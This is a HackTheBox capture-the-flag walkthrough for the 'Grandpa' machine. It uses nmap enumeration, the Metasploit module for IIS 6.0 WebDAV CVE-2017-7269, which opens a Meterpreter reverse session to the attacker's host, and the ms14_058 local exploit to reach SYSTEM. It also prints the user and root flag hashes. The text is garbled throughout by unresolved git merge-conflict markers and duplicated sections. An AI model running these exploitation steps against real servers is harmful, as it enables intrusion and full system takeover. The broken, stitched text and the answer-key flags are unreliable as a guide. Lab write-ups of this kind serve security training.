# HackTheBox Walkthrough - Grandpa

**Machine Name**: Grandpa  
**Target IP**: 10.129.95.233  
**Difficulty**: Easy  
**Objective**: Exploit IIS 6.0 and escalate privileges to get both user and root flags.

---

## 🧭 Enumeration

### 🔍 Nmap Scan

```bash
nmap -sV -sC -oA nmap/Grandpa 10.129.95.233
```

![nmap](img/nmap.png)
=======
>>>>>>> 9f1f476 (Add files via upload)
=======
![nmap](img/nmap.png)
>>>>>>> bbca5bf (Update README.md)
=======
![nmap](img/nmap.png)
>>>>>>> 96296fda4278cf5a222c6622ada25d5f3c20dabf

**Results:**
```
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
|_http-title: Under Construction
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
| http-webdav-scan: 
|   Server Type: Microsoft-IIS/6.0
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|   Server Date: Sun, 27 Jul 2025 12:26:38 GMT
|_  WebDAV type: Unknown
|_http-server-header: Microsoft-IIS/6.0
```

---

## 💥 Exploitation

### 🔓 Exploit IIS 6.0 WebDav (CVE-2017-7269)

<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
Exploit: [EDB 41992](https://www.exploit-db.com/exploits/41992)  
![exploitdb](img/exploitdb.png)
=======
Exploit: [EDB 41992](https://www.exploit-db.com/exploits/41992)
>>>>>>> 9f1f476 (Add files via upload)
=======
Exploit: [EDB 41992](https://www.exploit-db.com/exploits/41992)  
![exploitdb](img/exploitdb.png)
>>>>>>> bbca5bf (Update README.md)
=======
Exploit: [EDB 41992](https://www.exploit-db.com/exploits/41992)  
![exploitdb](img/exploitdb.png)
>>>>>>> 96296fda4278cf5a222c6622ada25d5f3c20dabf

```bash
msfconsole
use exploit/windows/iis/iis_webdav_scstoragepathfromurl
set RHOSTS 10.129.95.233
set LHOST 10.10.14.156
run
```

=======
>>>>>>> 96296fda4278cf5a222c6622ada25d5f3c20dabf
![meterpreter](img/meterpreter.png)

> Meterpreter session opened.

![lowprivi](img/lowprivi.png)

=======

> Meterpreter session opened.

---
>>>>>>> 9f1f476 (Add files via upload)
=======
![meterpreter](img/meterpreter.png)

> Meterpreter session opened.

![lowprivi](img/lowprivi.png)
>>>>>>> bbca5bf (Update README.md)
=======
>>>>>>> 96296fda4278cf5a222c6622ada25d5f3c20dabf

### 📍 Migrate Session (Stabilize)

```bash
ps
migrate 1896  # wmiprvse.exe
getuid
```

![migrate](img/migrate.png)
=======
>>>>>>> 9f1f476 (Add files via upload)
=======
![migrate](img/migrate.png)
>>>>>>> bbca5bf (Update README.md)
=======
![migrate](img/migrate.png)
>>>>>>> 96296fda4278cf5a222c6622ada25d5f3c20dabf

**Result**:
```
Server username: NT AUTHORITY\NETWORK SERVICE
```

---

## 🔧 Privilege Escalation

### 🔍 Use `local_exploit_suggester`

```bash
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

![recon](img/recon.png)
=======
>>>>>>> 9f1f476 (Add files via upload)
=======
![recon](img/recon.png)
>>>>>>> bbca5bf (Update README.md)
=======
![recon](img/recon.png)
>>>>>>> 96296fda4278cf5a222c6622ada25d5f3c20dabf

**Vulnerable Suggestions:**
- ms14_058_track_popup_menu
- ms14_070_tcpip_ioctl
- ms15_051_client_copy_image
- ms16_016_webdav
- ppr_flatten_rec
- etc...

### 🚀 Use `ms14_058_track_popup_menu`

```bash
use exploit/windows/local/ms14_058_track_popup_menu
set SESSION 1
set LHOST 10.10.14.156
run
```

![root](img/root.png)
=======
>>>>>>> 9f1f476 (Add files via upload)
=======
![root](img/root.png)
>>>>>>> bbca5bf (Update README.md)
=======
![root](img/root.png)
>>>>>>> 96296fda4278cf5a222c6622ada25d5f3c20dabf

```bash
getuid
```

**Result**:
```
Server username: NT AUTHORITY\SYSTEM
```

---

## 🧑‍💻 User Flag

```bash
cat C:\Users\[USERNAME]\Desktop\user.txt
```

![userflag](img/userflag.png)
=======

**Flag**:
```
bdff5ec67c3cff017f2bedc146a5d869
```
>>>>>>> 9f1f476 (Add files via upload)
=======
![userflag](img/userflag.png)
>>>>>>> bbca5bf (Update README.md)
=======
![userflag](img/userflag.png)
>>>>>>> 96296fda4278cf5a222c6622ada25d5f3c20dabf

---

## 👑 Root Flag

```bash
cat C:\Users\Administrator\Desktop\root.txt
```

![rootflag](img/rootflag.png)
=======

**Flag**:
```
9359e905a2c35f861f6a57cecf28bb7b
```
>>>>>>> 9f1f476 (Add files via upload)
=======
![rootflag](img/rootflag.png)
>>>>>>> bbca5bf (Update README.md)
=======
![rootflag](img/rootflag.png)
>>>>>>> 96296fda4278cf5a222c6622ada25d5f3c20dabf

---
